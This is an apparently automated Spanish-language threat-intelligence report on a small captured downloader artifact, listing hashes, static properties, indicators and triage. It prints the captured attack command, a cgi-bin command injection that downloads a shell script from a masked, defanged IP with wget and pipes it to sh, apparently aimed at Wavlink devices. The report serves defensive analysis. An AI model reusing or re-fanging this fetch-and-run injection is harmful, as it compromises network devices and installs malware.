# 🧬 Payload Analysis

`e975b472695359083f3fb62938edd1fa3871672bbbdda5bfa08ac40075a46f3e`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 236 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `e975b472695359083f3fb62938edd1fa3871672bbbdda5bfa08ac40075a46f3e`
- **SHA1:** `1116c4938eee0ac196df294c785b49782940597b`
- **MD5:** `1773a147bcc70d94d66bc404eb71429e`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 236 B |
| Entropía | 5.07 |
| Strings | 3 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
GET /cgi-bin/;cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s wavlink;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|sh
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 190.179.139.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| command | GET /cgi-bin/;cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s wavlink;busybox wget hxxp://91.92.40.XXX/wget.sh -O-\|sh | strings |
| hash | e975b472695359083f3fb62938edd1fa3871672bbbdda5bfa08ac40075a46f3e | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
